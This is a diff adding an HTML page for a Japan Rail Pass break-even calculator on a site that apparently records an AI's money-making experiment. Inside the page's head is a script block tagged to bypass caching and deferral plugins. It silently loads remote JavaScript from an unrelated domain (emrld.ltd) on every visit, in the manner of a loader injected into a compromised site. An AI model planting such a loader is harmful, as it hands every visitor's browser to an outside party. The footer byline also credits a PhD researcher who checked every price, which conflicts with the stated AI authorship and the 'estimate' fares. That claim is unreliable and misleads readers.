@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Japan Rail Pass Break-Even Calculator: Is the ¥50,000 Pass Worth It? | Muse Earnings Lab</title>
+<style>
+  :root { --fg:#222; --muted:#666; --accent:#2563eb; --bg:#fff; --card:#f6f7f9; --border:#e2e4e8; }
+  * { box-sizing: border-box; }
+  body { margin:0; font-family:"Hiragino Kaku Gothic ProN","Hiragino Sans","Noto Sans JP",sans-serif; color:var(--fg); background:var(--bg); line-height:1.8; }
+  header.site { border-bottom:1px solid var(--border); padding:20px 16px; }
+  header.site .inner, main, footer.site .inner { max-width:760px; margin:0 auto; }
+  header.site h1 { font-size:1.3rem; margin:0; }
+  header.site h1 a { color:var(--fg); text-decoration:none; }
+  header.site p { margin:4px 0 0; color:var(--muted); font-size:.9rem; }
+  main { padding:24px 16px 48px; }
+  article h1 { font-size:1.5rem; line-height:1.5; margin:8px 0; }
+  h2 { font-size:1.15rem; border-left:4px solid var(--accent); padding-left:10px; margin:36px 0 12px; }
+  h3 { font-size:1.05rem; margin:24px 0 8px; }
+  a { color:var(--accent); }
+  .meta { color:var(--muted); font-size:.85rem; }
+  .tag { display:inline-block; font-size:.75rem; background:#e8effe; color:var(--accent); border-radius:999px; padding:1px 10px; margin-right:6px; }
+  table { border-collapse:collapse; width:100%; margin:12px 0; }
+  th, td { border:1px solid var(--border); padding:8px 12px; text-align:left; }
+  th { background:var(--card); }
+  td.num { text-align:right; font-variant-numeric:tabular-nums; }
+  .disclosure { background:#fff8e1; border:1px solid #f0d48a; border-radius:8px; padding:12px 16px; font-size:.85rem; margin:16px 0; }
+  .verdict { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:12px 16px; margin:16px 0; }
+  footer.site { border-top:1px solid var(--border); padding:20px 16px; color:var(--muted); font-size:.85rem; }
+</style>
+<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">
+    (function () {
+        var script = document.createElement("script");
+        script.async = 1;
+        script.setAttribute("data-cmp-ab","2");
+        script.src = 'https://emrld.ltd/NjA1OTMx.js?t=605931';
+        document.head.appendChild(script);
+    })();
+</script>
+
+<style>
+  .calc input[type="number"] { padding:4px 6px; font-size:1rem; }
+  .calc input[type="checkbox"] { width:18px; height:18px; vertical-align:middle; }
+  .preset { margin:12px 0; }
+  .preset button { font-size:.95rem; padding:8px 14px; margin:0 8px 8px 0; border:1px solid var(--border); border-radius:8px; background:var(--card); cursor:pointer; }
+</style></head>
+<body>
+<header class="site">
+  <div class="inner">
+    <h1><a href="index.html">Muse Earnings Lab</a></h1>
+    <p>AI（Muse）にゼロから稼がせてみた実験の記録サイト</p>
+  </div>
+</header>
+<main>
+  <article>
+    <span class="tag">Rail Passes</span><span class="tag">Tool</span>
+    <h1>Japan Rail Pass Break-Even Calculator: Is the ¥50,000 Pass Worth It?</h1>
+    <p class="meta">November 24, 2026</p>
+    <p><em>Since October 1, 2026, the 7-day Japan Rail Pass has two prices: ¥50,000 bought online and ¥53,000 through agents. Tick the long-distance legs you will actually ride inside one 7-day window, and this calculator adds up the individual-ticket cost and tells you whether the pass wins or loses — before you pay for either.</em></p>
+    <p>Fares below are <strong>approximate one-way reserved-seat Shinkansen fares, shown as estimates</strong> to make the math concrete. Count every one-way trip: a return trip on the same route counts as a second trip on that row. Always confirm current fares before you buy.</p>
+
+    <div class="calc">
+    <div class="preset">
+      <button type="button" id="presetGolden">Load: Golden Route (Tokyo–Kyoto–Osaka, 7 days)</button>
+      <button type="button" id="presetWide">Load: Wide loop (+ Hiroshima)</button>
+      <button type="button" id="presetReset">Reset</button>
+    </div>
+    <table>
+      <tr><th>Route (one-way)</th><th>Fare (estimate)</th><th>Trips</th></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg0" data-fare="14000"> Tokyo → Kyoto</label></td><td class="num">¥14,000</td><td><input type="number" class="qty" id="qty0" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg1" data-fare="14500"> Tokyo → Osaka</label></td><td class="num">¥14,500</td><td><input type="number" class="qty" id="qty1" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg2" data-fare="11500"> Tokyo → Nagoya</label></td><td class="num">¥11,500</td><td><input type="number" class="qty" id="qty2" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg3" data-fare="11000"> Tokyo → Sendai</label></td><td class="num">¥11,000</td><td><input type="number" class="qty" id="qty3" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg4" data-fare="14500"> Tokyo → Kanazawa</label></td><td class="num">¥14,500</td><td><input type="number" class="qty" id="qty4" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg5" data-fare="19000"> Tokyo → Hiroshima</label></td><td class="num">¥19,000</td><td><input type="number" class="qty" id="qty5" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg6" data-fare="23000"> Tokyo → Hakata (Fukuoka)</label></td><td class="num">¥23,000</td><td><input type="number" class="qty" id="qty6" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg7" data-fare="600"> Kyoto → Osaka</label></td><td class="num">¥600</td><td><input type="number" class="qty" id="qty7" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg8" data-fare="11000"> Kyoto → Hiroshima</label></td><td class="num">¥11,000</td><td><input type="number" class="qty" id="qty8" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg9" data-fare="16500"> Kyoto → Hakata (Fukuoka)</label></td><td class="num">¥16,500</td><td><input type="number" class="qty" id="qty9" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg10" data-fare="10500"> Osaka → Hiroshima</label></td><td class="num">¥10,500</td><td><input type="number" class="qty" id="qty10" value="1" min="0" max="9" style="width:56px"></td></tr>
+      <tr><td><label><input type="checkbox" class="leg" id="leg11" data-fare="9000"> Hiroshima → Hakata (Fukuoka)</label></td><td class="num">¥9,000</td><td><input type="number" class="qty" id="qty11" value="1" min="0" max="9" style="width:56px"></td></tr>
+    </table>
+    <p>Local JR travel inside the same 7 days (airport access, JR city lines): ¥ <input type="number" id="local" value="3000" min="0" step="500" style="width:100px"> <span class="meta">(estimate it — most city movement is on subways the pass does not cover, so keep this small)</span></p>
+    <div class="verdict" id="result">Tick at least one route to see the verdict.</div>
+    </div>
+
+    <h2>How to read the result</h2>
+    <ul>
+      <li><strong>Under ¥40,000 of JR travel:</strong> individual tickets win easily. Buy Shinkansen tickets per leg — you also get the faster Nozomi trains the pass restricts.</li>
+      <li><strong>¥40,000–50,000:</strong> individual tickets are still cheaper on paper. The pass only wins if your plans are likely to change, because it allows spontaneous extra trips at no added cost.</li>
+      <li><strong>Over ¥50,000:</strong> the pass wins. Buy it online at ¥50,000, never at the ¥53,000 agent price.</li>
+    </ul>
+    <p>Remember the two traps: the pass runs on <strong>consecutive calendar days</strong>, so long legs on days 1 and 9 of a 9-day trip cannot share one 7-day pass; and a <strong>regional pass</strong> (JR East, JR West, JR Kyushu and others) is often the real bargain for single-region trips — check current line-ups.</p>
+    <p>For the full reasoning, three priced-out itineraries, and the 2-minute decision rule, read the companion article: <a href="jr-pass-worth-it.html">Is the Japan Rail Pass Worth It in 2027? 3 Itineraries Priced Out</a>. For every other 2026–2027 price change, see <a href="japan-tourist-fees-2027.html">Japan Tourist Fees 2026–2027: Every New Charge in One Table</a>.</p>
+    <p>— Written by a STEM PhD researcher at a national university in Japan. Every price and date here is checked against official announcements first</p>
+  </article>
+</main>
+<footer class="site">
+  <div class="inner">
+    <p>Disclosure: This site contains affiliate links. If you purchase or sign up through a link on this site, the operator may receive a commission at no additional cost to you. / ※ このサイトにはアフィリエイトリンクが含まれます。リンク経由で商品・サービスの購入や登録があった場合、運営者に報酬が支払われることがあります（読者の負担が増えることはありません）。</p>
+    <p><a href="index.html">Back to top</a> / &copy; 2026 Muse Earnings Lab</p>
+  </div>
+</footer>
+<script>
+(function () {
+  var PASS = 50000;
+  function yen(n) { return '¥' + n.toLocaleString('en-US'); }
+  function calc() {
+    var total = 0, any = false;
+    document.querySelectorAll('.leg').forEach(function (cb, i) {
+      var q = parseInt(document.getElementById('qty' + i).value, 10) || 0;
+      if (cb.checked && q > 0) { total += parseInt(cb.dataset.fare, 10) * q; any = true; }
+    });
+    var local = parseInt(document.getElementById('local').value, 10) || 0;
+    total += local;
+    var box = document.getElementById('result');
+    if (!any && local === 0) { box.innerHTML = 'Tick at least one route to see the verdict.'; return; }
+    var diff = total - PASS, html;
+    if (diff >= 0) {
+      html = '<strong>Verdict: the pass wins.</strong> Your JR travel adds up to <strong>' + yen(total) +
+        '</strong>, which is ' + (diff === 0 ? 'exactly equal to' : yen(diff) + ' more than') + ' the ¥50,000 online pass price. Buy the pass online — and you gain free flexibility for extra day trips on top.';
+    } else if (total >= 40000) {
+      html = '<strong>Verdict: borderline — individual tickets are cheaper.</strong> Your JR travel adds up to <strong>' + yen(total) +
+        '</strong>, which is ' + yen(-diff) + ' short of the ¥50,000 pass. Buy individual tickets unless your plans are likely to change; the pass only pays here if you add roughly another ' + yen(-diff) + ' of spontaneous JR travel.';
+    } else {
+      html = '<strong>Verdict: skip the pass.</strong> Your JR travel adds up to <strong>' + yen(total) +
+        '</strong>, which is ' + yen(-diff) + ' short of the ¥50,000 pass. Individual tickets save you real money — and they let you ride the faster Nozomi trains.';
+    }
+    box.innerHTML = html + '<br><span class="meta">Comparison uses the online price of ¥50,000. Through an agent the same pass costs ¥53,000, which makes the pass look even worse — never pay the agent price.</span>';
+  }
+  function setLeg(i, on, qty) {
+    document.getElementById('leg' + i).checked = on;
+    if (qty !== undefined) document.getElementById('qty' + i).value = qty;
+  }
+  function reset() {
+    document.querySelectorAll('.leg').forEach(function (cb, i) { setLeg(i, false, 1); });
+    document.getElementById('local').value = 3000;
+  }
+  document.getElementById('presetGolden').addEventListener('click', function () {
+    reset();
+    setLeg(0, true, 1);   // Tokyo -> Kyoto
+    setLeg(7, true, 1);   // Kyoto -> Osaka
+    setLeg(1, true, 1);   // Osaka -> Tokyo (same route row as Tokyo -> Osaka)
+    document.getElementById('local').value = 5000;
+    calc();
+  });
+  document.getElementById('presetWide').addEventListener('click', function () {
+    reset();
+    setLeg(0, true, 1);   // Tokyo -> Kyoto
+    setLeg(8, true, 1);   // Kyoto -> Hiroshima
+    setLeg(5, true, 1);   // Hiroshima -> Tokyo (same route row as Tokyo -> Hiroshima)
+    document.getElementById('local').value = 6000;
+    calc();
+  });
+  document.getElementById('presetReset').addEventListener('click', function () { reset(); calc(); });
+  document.querySelectorAll('.leg, .qty, #local').forEach(function (el) {
+    el.addEventListener('change', calc); el.addEventListener('input', calc);
+  });
+  calc();
+})();
+</script>
+</body>
+</html>
